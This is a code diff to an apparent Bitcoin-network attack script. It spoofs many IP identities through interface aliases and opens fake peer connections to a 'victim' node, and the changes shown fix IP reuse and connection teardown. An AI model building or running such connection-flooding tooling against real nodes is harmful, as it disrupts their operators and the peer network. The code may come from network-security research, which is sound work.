@@ -42,11 +42,15 @@ def bitcoin(cmd):
 # Generate a random identity using the broadcast address template
 def random_ip():
 	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
-	ip = broadcast_address
-	old_ip = ''
-	while(old_ip != ip):
-		old_ip = ip
-		ip = ip.replace('255', str(random.randint(0, 255)), 1)
+	while(True):
+		ip = broadcast_address
+		old_ip = ''
+		while(old_ip != ip):
+			old_ip = ip
+			ip = ip.replace('255', str(random.randint(0, 255)), 1)
+		# Don't accept already assigned IPs
+		if ip not in [x[0] for x in identity_address]:
+			break
 	return ip
 
 # Create an alias for a specified identity
@@ -71,21 +75,13 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	return msg
 
 # Close a connection
-def close_connection(index):
-	if index < 0 and index >= len(identity_socket):
-		print('Error: Failed to close connection')
-		return
-	ip, port = identity_address[index]
-	interface = identity_interface[index]
-	socket = identity_socket[index]
-
-	del identity_address[index]
-	del identity_socket[index]
-	del identity_interface[index]
-
+def close_connection(socket, ip, port, interface):
 	socket.close()
 	terminal(f'sudo ifconfig {interface} {ip} down')
-
+	
+	identity_socket.remove(socket)
+	identity_interface.remove(interface)
+	identity_address.remove((ip, port))
 	print(f'Successfully closed connection to ({ip} : {port})')
 
 # Creates a fake connection to the victim
@@ -190,9 +186,8 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 				socket.send(pong.to_bytes())
 
 		except Exception as e:
+			close_connection(socket, from_ip, from_port, interface)
 			print("Closing socket because of error: " + str(e))
-			close_connection(rand_i)
-			time.sleep(5)
 			make_fake_connection(rand_ip, victim_ip, False) # Use old IP
 			#make_fake_connection(random_ip(), victim_ip, False)
 			sys.exit() # Stop the current thread that sniffs for packets on this interface
